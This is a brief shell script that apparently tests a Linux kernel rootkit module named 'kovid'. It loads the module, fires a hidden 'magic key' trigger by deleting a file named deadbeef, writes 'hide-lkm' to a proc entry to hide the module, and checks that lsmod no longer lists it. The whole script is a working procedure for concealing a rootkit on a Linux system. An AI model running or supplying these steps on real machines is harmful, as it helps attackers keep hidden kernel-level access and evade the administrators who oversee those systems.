#!/bin/sh

# Insert the kovid module
insmod kovid.ko

# Verify that the module is loaded
echo "Checking if kovid module is loaded:"
lsmod | grep kovid

# The kovid trick - toggle proc interface using magic key
rm -f deadbeef

# Hide the module
echo "Hiding the kovid module:"
echo hide-lkm > /proc/myprocname

# Verify that the module is hidden
echo "Checking if kovid module is hidden:"
lsmod | grep kovid
